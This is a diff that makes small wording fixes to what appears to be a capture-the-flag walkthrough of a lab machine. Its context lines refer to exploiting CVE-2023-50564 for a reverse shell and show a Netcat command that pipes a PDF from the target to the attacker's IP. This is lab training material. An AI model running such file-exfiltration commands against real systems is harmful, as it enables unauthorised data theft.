@@ -154,7 +154,7 @@ If instructions are still unclear to you, watch this:
 https://www.youtube.com/watch?v=GpL_rz8jgro
 ```
 
-### Exploitation(Reverse shell + Netcat) CVE-2023-50564 
+### Exploitation (Reverse shell + Netcat) CVE-2023-50564 
 
 Let's use that exploit.
 
@@ -217,7 +217,7 @@ When it asks you about `ZIP file path` provide your `.zip` filename.
 
 #### Disclaimer
 
-When something is not working for you, pay attention to the directories form when you execute scripts or create files.
+When something is not working for you, pay attention to the directories from which you execute scripts or create files.
 
 In the **Netcat** tab we have a shell.
 
@@ -267,11 +267,11 @@ nc {your tun0 ip} {port you have chosen} < 'Using OpenVAS.pdf'
 
 ![PE](./Screenshots/greenhornpe3.png)
 
-remember to ber in `/home/junior` path.
+remember to be in `/home/junior` path.
 
 ![PE](./Screenshots/greenhornpe4.png)
 
-This is what the `.pdf` content looks like:
+This is how the `.pdf` content looks like:
 
 ![PE](./Screenshots/greenhornpe5.png)
 
